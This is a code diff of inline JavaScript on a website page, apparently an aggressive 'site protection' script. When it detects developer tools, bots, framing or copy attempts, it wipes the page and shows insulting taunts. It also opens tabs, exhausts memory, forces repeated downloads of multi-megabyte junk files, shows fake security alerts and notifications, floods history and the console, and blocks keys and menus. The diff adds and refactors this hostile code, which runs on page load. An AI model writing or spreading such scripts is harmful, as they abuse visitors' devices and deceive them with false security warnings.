@@ -1133,26 +1133,11 @@
     });
 (function() {
   const dom = "federal.wtf";
-  const taunts = [
-    "Nice try skid.",
-    "Fuck off.",
-    "You thought?",
-    "Not today.",
-    "Go away skid.",
-    "Inspecting is for losers.",
-    "L + ratio.",
-    "Cope harder.",
-    "Stay mad.",
-    "Too slow bozo.",
-    "Get good.",
-    "Skill issue."
-  ];
+  const taunts = ["Nice try skid.", "Fuck off.", "You thought?", "Not today.", "Go away skid.", "Inspecting is for losers.", "L + ratio.", "Cope harder.", "Stay mad.", "Too slow bozo.", "Get good.", "Skill issue."];
   const getT = () => taunts[Math.floor(Math.random() * taunts.length)];
   const key = 'site_protection_federal_wtf';
   
-  // Main protection function – clears the document and shows a taunt.
-  function aggro(trigger) {
-    console.log("Protection triggered by:", trigger);
+  function aggro() {
     document.documentElement.innerHTML = '';
     
     const t = document.createElement('div');
@@ -1222,16 +1207,15 @@
     }
   }
   
-  // The counter() function includes extra measures (opening tabs, memory allocation,
-  // file downloads, alerts, history flooding, notifications, and console spam).
   function counter() {
     function tabs() {
       const n = Math.floor(Math.random() * 3) + 1;
+      
       for (let i = 0; i < n; i++) {
         setTimeout(() => {
           const txt = getT();
-          console.log("Opening extra tab with message:", txt);
           const tab = window.open('about:blank', '_blank');
+          
           if (tab) {
             tab.document.write(`<!DOCTYPE html><html><head><title>${txt}</title><style>body{background:black;color:#cdbb8a;font-family:Consolas,monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}h1{font-size:4rem}</style></head><body><h1>${txt}</h1></body></html>`);
           }
@@ -1240,7 +1224,6 @@
     }
     
     function mem() {
-      console.log("Allocating memory.");
       const arr = [];
       for (let i = 0; i < 10; i++) {
         const a = new Array(1000000).fill('x');
@@ -1250,18 +1233,19 @@
     }
     
     function spamFiles() {
-      console.log("Initiating spam file downloads.");
       const ext = ['.txt', '.js', '.html', '.css', '.jpg', '.png', '.json', '.xml', '.pdf', '.svg'];
       const pref = ['skid', 'loser', 'nice-try', 'L-plus-ratio', 'cope', 'stay-mad', 'skill-issue', 'get-good', 'bozo', 'no-inspect'];
       
-      function makeBlob() {
+      function makeBlob(size) {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         let str = '';
         const mb = Math.floor(Math.random() * 10) + 1; // 1-10MB
         const len = mb * 1024 * 1024;
-        for (let i = 0; i < len; i++) {
+        
+        for(let i = 0; i < len; i++) {
           str += chars.charAt(Math.floor(Math.random() * chars.length));
         }
+        
         return new Blob([str], {type: 'application/octet-stream'});
       }
       
@@ -1271,14 +1255,17 @@
           const p = pref[Math.floor(Math.random() * pref.length)];
           const n = Math.floor(Math.random() * 9999);
           const fname = `${p}-${n}${e}`;
+          
           const blob = makeBlob();
           const url = URL.createObjectURL(blob);
+          
           const a = document.createElement('a');
           a.href = url;
           a.download = fname;
           a.style.display = 'none';
           document.body.appendChild(a);
           a.click();
+          
           setTimeout(() => {
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
@@ -1286,19 +1273,16 @@
         }
       }
       
-      for (let i = 0; i < 10; i++) {
+      for(let i = 0; i < 10; i++) {
         setTimeout(dlFile, i * 300);
       }
       
       setInterval(() => {
-        if (Math.random() > 0.7) {
-          console.log("Random spam file download triggered.");
-          dlFile();
-        }
+        if(Math.random() > 0.7) dlFile();
       }, 5000);
     }
     
-    function alertMsg() {
+    function alert() {
       setTimeout(() => {
         window.alert("This website has detected suspicious activity and has been blocked.");
       }, 2000);
@@ -1314,7 +1298,6 @@
     
     function notif() {
       if ('Notification' in window) {
-        console.log("Requesting notification permission.");
         Notification.requestPermission().then(p => {
           if (p === 'granted') {
             new Notification('Security Alert', {
@@ -1326,19 +1309,19 @@
       }
     }
     
-    // spamC: Flood the console with messages.
     function spamC() {
       try {
-        console.log("Starting console spam.");
         const og = {
           log: console.log,
           error: console.error,
           warn: console.warn
         };
+        
         for (let i = 0; i < 10000; i++) {
-          og.error("DETECTED: Inspection attempt #" + i);
-          og.warn("WARNING: Page inspection detected");
-          og.log(getT());
+          //og.error("DETECTED: Inspection attempt #" + i);
+          //og.warn("WARNING: Page inspection detected");
+          //og.log(getT());
+          
           if (i % 500 === 0) {
             debugger;
           }
@@ -1349,7 +1332,7 @@
     setTimeout(tabs, 500);
     setTimeout(mem, 1000);
     setTimeout(spamFiles, 1000);
-    setTimeout(alertMsg, 2000);
+    setTimeout(alert, 2000);
     setTimeout(flood, 2500);
     setTimeout(notif, 3000);
     setTimeout(spamC, 100);
@@ -1358,105 +1341,148 @@
     setInterval(() => window.scrollTo(0, Math.random() * 9999), 500);
   }
   
-  // Use disC() to preserve the console while still handling global errors.
+  if ((window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160)) {
+    aggro();
+    return;
+  }
+  
+  if (window.self !== window.top) {
+    window.top.location.href = window.self.location.href;
+    return;
+  }
+  
+  if (window.location.protocol === 'file:') {
+    aggro();
+    return;
+  }
+  
+  if (window.location.hostname !== dom && window.location.hostname !== "www." + dom) {
+    aggro();
+    return;
+  }
+  
+  try {
+    if (localStorage.getItem(key) === 'protected') {
+      aggro();
+      return;
+    }
+  } catch (e) {
+    if (document.cookie.indexOf(key + '=protected') !== -1) {
+      aggro();
+      return;
+    }
+  }
+  
+  function reset() {
+    try {
+      localStorage.removeItem(key);
+    } catch (e) {
+      document.cookie = key + "=; path=/; max-age=-1";
+    }
+  }
+  
+  reset();
+  
   function disC() {
+    const og = {};
+    for (const m in console) {
+      if (typeof console[m] === 'function') {
+        og[m] = console[m];
+        console[m] = function() {
+          aggro();
+          return false;
+        };
+      }
+    }
+    
     Object.defineProperty(window, 'console', {
       get: function() { return console; },
       set: function() { return console; },
       configurable: false
     });
+    
     window.onerror = function(msg, src, ln, col, err) {
-      if (msg.toLowerCase().includes('script') || msg.toLowerCase().includes('debugger')) {
-        aggro("Global error triggered: " + msg);
+      if (msg.toLowerCase().includes('script') || 
+          msg.toLowerCase().includes('debugger')) {
+        aggro();
       }
       return true;
     };
   }
   
-  // detDev() remains for some checks (like performance delays and DOM property accesses).
   function detDev() {
     setInterval(function() {
-      const dimCheck = (window.outerWidth - window.innerWidth > 160) ||
-                       (window.outerHeight - window.innerHeight > 160);
-      if (dimCheck) {
-        aggro("Window dimension check triggered.");
+      const w = window.outerWidth - window.innerWidth > 160;
+      const h = window.outerHeight - window.innerHeight > 160;
+      
+      if (w || h) {
+        aggro();
       }
     }, 500);
     
     setInterval(function() {
       const el = document.createElement('div');
       let c = 0;
+      
       Object.defineProperty(el, 'id', {
         get: function() {
           c++;
           if (c > 1) {
-            aggro("Multiple access to DOM property detected.");
+            aggro();
           }
           return 'det';
         }
       });
+      
       el.style.display = 'none';
       document.body.appendChild(el);
+      console.log(el);
+      console.clear();
+      
       setTimeout(function() {
         if (document.contains(el)) {
           document.body.removeChild(el);
         }
       }, 200);
     }, 1000);
-    
-    const s = performance.now();
-    debugger;
-    const e = performance.now();
-    if (e - s > 100) {
-      aggro("Performance delay detected: possible debugger usage.");
-    }
   }
   
-  // Improved keybind disabler – attempts to block F12, Ctrl+Shift+I/J/C, and Ctrl/Cmd+U/S/P.
   function block() {
-    window.addEventListener('keydown', function(e) {
+    document.addEventListener('keydown', function(e) {
       if (e.key === 'F12' || e.keyCode === 123) {
         e.preventDefault();
-        e.stopPropagation();
-        aggro("F12 key pressed.");
+        aggro();
         return false;
       }
       
-      if ((e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase())) ||
-          (e.metaKey && e.altKey && ['i','j','c'].includes(e.key.toLowerCase()))) {
+      if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
+          (e.metaKey && e.altKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
         e.preventDefault();
-        e.stopPropagation();
-        aggro("Restricted key combination pressed.");
+        aggro();
         return false;
       }
       
-      if ((e.ctrlKey || e.metaKey) && ['u','s','p'].includes(e.key.toLowerCase())) {
+      if ((e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p')) || 
+          (e.metaKey && (e.key === 'u' || e.key === 's' || e.key === 'p'))) {
         e.preventDefault();
-        e.stopPropagation();
-        aggro("Restricted key combination (Ctrl/Cmd+U/S/P) pressed.");
         return false;
       }
     }, true);
   }
   
-  // Block context menu and other events.
   function blockA() {
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
-      e.stopPropagation();
-      aggro("Context menu blocked.");
       return false;
-    }, true);
+    });
     
     ['copy', 'cut', 'paste', 'selectstart', 'dragstart'].forEach(function(ev) {
       document.addEventListener(ev, function(e) {
         if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
           e.preventDefault();
-          e.stopPropagation();
-          aggro("Event " + ev + " blocked on element.");
           return false;
         }
-      }, true);
+      });
     });
     
     const s = document.createElement('style');
@@ -1464,7 +1490,6 @@
     document.head.appendChild(s);
   }
   
-  // Mutation observer to detect DOM changes.
   function detDOM() {
     const div = document.createElement('div');
     div.id = 'dom-det';
@@ -1474,7 +1499,7 @@
     const obs = new MutationObserver(function(muts) {
       for (const m of muts) {
         if (m.type === 'childList' || m.type === 'attributes') {
-          aggro("DOM mutation detected.");
+          aggro();
         }
       }
     });
@@ -1488,38 +1513,40 @@
     return div;
   }
   
-  // Bot and headless browser detection.
   function detBot() {
     const ua = navigator.userAgent.toLowerCase();
     const bp = ['bot', 'spider', 'crawl', 'wget', 'curl', 'scrape', 'http', 'java', 'python', 'requests', 'headless'];
     
     for (const p of bp) {
       if (ua.includes(p)) {
-        aggro("Bot-related keyword detected in user agent: " + p);
+        aggro();
         return true;
       }
     }
     
-    if (navigator.webdriver || navigator.plugins.length === 0 || navigator.languages.length === 0) {
-      aggro("Webdriver or missing plugins/languages detected.");
+    if (navigator.webdriver || 
+        navigator.plugins.length === 0 || 
+        navigator.languages.length === 0) {
+      aggro();
       return true;
     }
     
     return false;
   }
   
-  // Break-off detection for improper framing or protocol.
   function breakOff() {
     function chkConn() {
       const img = new Image();
       img.onload = function() {
         document.body.setAttribute('data-on', 'true');
       };
+      
       img.onerror = function() {
         if (document.body.getAttribute('data-on') === 'true') {
-          aggro("Connection check failed: possible break-off.");
+          aggro();
         }
       };
+      
       img.src = '//' + dom + '/favicon.ico?t=' + Date.now();
     }
     
@@ -1531,26 +1558,6 @@
     s.innerHTML = `(function(){if(window.location.protocol==='file:'||window.location.hostname!=='${dom}'&&window.location.hostname!=='www.${dom}'){setTimeout(function(){const t=['Nice try skid.','Fuck off.','You thought?','Not today.','Go away skid.','L + ratio.','Cope harder.','Stay mad.','Too slow bozo.','Get good.','Skill issue.'];const r=t[Math.floor(Math.random()*t.length)];document.documentElement.innerHTML='';document.body.innerHTML='<h1 style="color:#cdbb8a;text-align:center;padding-top:45vh;font-size:5rem">'+r+'</h1>';},500);}})();`;
     document.head.appendChild(s);
   }
-  
-  // --- New: Detect Dev Tools via toString hack ---
-  function detectDevToolsToString() {
-    // Create an object with a getter on one of its properties.
-    let element = new Image();
-    Object.defineProperty(element, 'id', {
-      get: function() {
-        aggro("Dev tools detected via toString hack.");
-        return '';
-      }
-    });
-    // Log the object so that, if dev tools are open,
-    // its properties will be inspected, triggering the getter.
-    console.log("%c", element);
-  }
-  // Run this check repeatedly (e.g. every second).
-  setInterval(detectDevToolsToString, 1000);
-  
-  // Omit spam() and spamC() functions for clean output?  
-  // In this version we keep them intact.
   
   function spam() {
     const d = document.createElement('div');
@@ -1570,6 +1577,7 @@
     function fake() {
       for (let i = 0; i < 1000; i++) {
         const t = Math.random() > 0.5 ? 'script' : 'link';
+        
         if (t === 'script') {
           const s = document.createElement('script');
           s.src = rStr(10) + '.js';
@@ -1589,10 +1597,12 @@
       const j = document.createElement('div');
       j.style.display = 'none';
       j.id = 'junk';
+      
       let data = '';
       for (let i = 0; i < 1000000; i++) {
         data += rStr(10);
       }
+      
       j.setAttribute('data-junk', data);
       d.appendChild(j);
     }
@@ -1601,11 +1611,13 @@
       const c = document.createElement('div');
       c.style.display = 'none';
       c.id = 'fake-img';
+      
       for (let i = 0; i < 50; i++) {
         const im = document.createElement('img');
         im.src = 'data:image/gif;base64,' + rStr(10000);
         c.appendChild(im);
       }
+      
       d.appendChild(c);
     }
     
@@ -1621,26 +1633,6 @@
     }, 30000);
   }
   
-  function spamC() {
-    try {
-      console.log("Starting console spam.");
-      const og = {
-        log: console.log,
-        error: console.error,
-        warn: console.warn
-      };
-      for (let i = 0; i < 10000; i++) {
-        og.error("DETECTED: Inspection attempt #" + i);
-        og.warn("WARNING: Page inspection detected");
-        og.log(getT());
-        if (i % 500 === 0) {
-          debugger;
-        }
-      }
-    } catch (e) {}
-  }
-  
-  // Initialize all routines.
   disC();
   detDev();
   block();
@@ -1653,41 +1645,7 @@
   }
   
   window.addEventListener('beforeunload', reset);
-  
-  // Final checks.
-  if ((window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160)) {
-    aggro("Final check: Outer dimension condition triggered.");
-    return;
-  }
-  
-  if (window.self !== window.top) {
-    window.top.location.href = window.self.location.href;
-    return;
-  }
-  
-  if (window.location.protocol === 'file:') {
-    aggro("Final check: File protocol detected.");
-    return;
-  }
-  
-  if (window.location.hostname !== dom && window.location.hostname !== "www." + dom) {
-    aggro("Final check: Domain mismatch detected.");
-    return;
-  }
-  
-  try {
-    if (localStorage.getItem(key) === 'protected') {
-      aggro("Final check: Local storage flag 'protected' detected.");
-      return;
-    }
-  } catch (e) {
-    if (document.cookie.indexOf(key + '=protected') !== -1) {
-      aggro("Final check: Cookie flag 'protected' detected.");
-      return;
-    }
-  }
 })();
-
   </script>
 </body>
 </html>
